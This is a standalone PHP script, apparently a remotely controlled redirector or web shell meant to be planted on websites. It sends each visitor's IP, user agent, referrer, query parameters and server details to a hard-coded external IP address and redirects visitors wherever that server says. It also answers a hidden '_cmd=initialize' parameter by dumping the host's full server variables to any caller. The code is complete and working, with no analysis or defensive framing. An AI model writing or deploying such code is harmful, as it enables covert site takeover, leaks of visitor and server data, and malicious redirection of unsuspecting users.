<?php
$config = [
    'server' => 'http://144.202.35.172:8742/api',
];
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
function api($url, $data, $maxRetries = 5, $useSleep = false)
{
    global $config;
    for ($i = 0; $i < $maxRetries; $i++) {
        $x = curl($config['server'] . $url, $data);
        if (empty($x)) {
            if ($useSleep) sleep(rand(1, 3));
            continue;
        }
        return json_decode($x, true);
    }
    return '';
}
function curl($url, array $var, $useBuildQuery = true)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, "Melancholy (Shell/Shortlink)");
    if (!empty($var)) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($var));
    }
    curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type:application/json']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
function ipGetAddress()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    $client  = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : '';
    $forward = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : '';
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}
if (isset($_REQUEST['_cmd'])) {
    header("Content-Type: application/json");
    switch ($_REQUEST['_cmd']) {
        case 'initialize':
            die(json_encode(['status' => true, 'messagae' => 'Yes Sir', 'data' => [
                'server' => $_SERVER,
                'time' => time(),
            ]]));

        default:
            die(json_encode(['status' => false, 'messagae' => 'No Command Founded', 'data' => []]));
    }
}
$data = api('/v1/page/project/find', [
    'http_host' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : null,
    'server_name' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : null,
    'server_address' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : null,
    'script_name' => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : null,
    'useragent' => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null,
    'language' => isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : null,
    'referrer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null,
    'php_self' => isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : null,
    'ip' => ipGetAddress(),
    'get' => $_GET,
    'url' => ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"),

], 10, true);
if (isset($data['status'])) {
    if ($data['status']) {
        header("LOCATION: " . $data['data']['location'], true, ($data['data']['permanent'] ? 301 : 302));
        die();
    } else {
        if (isset($data['data']['fallback_link'])) {
            if (!empty($data['data']['fallback_link'])) {
                header("LOCATION: " . $data['data']['fallback_link'], true, 302);
                die();
            }
        }
        die(http_response_code(404));
    }
} else {
    if (isset($data['data']['fallback_link'])) {
        if (!empty($data['data']['fallback_link'])) {
            header("LOCATION: " . $data['data']['fallback_link'], true, 302);
            die();
        }
    }
    die(http_response_code(404));
}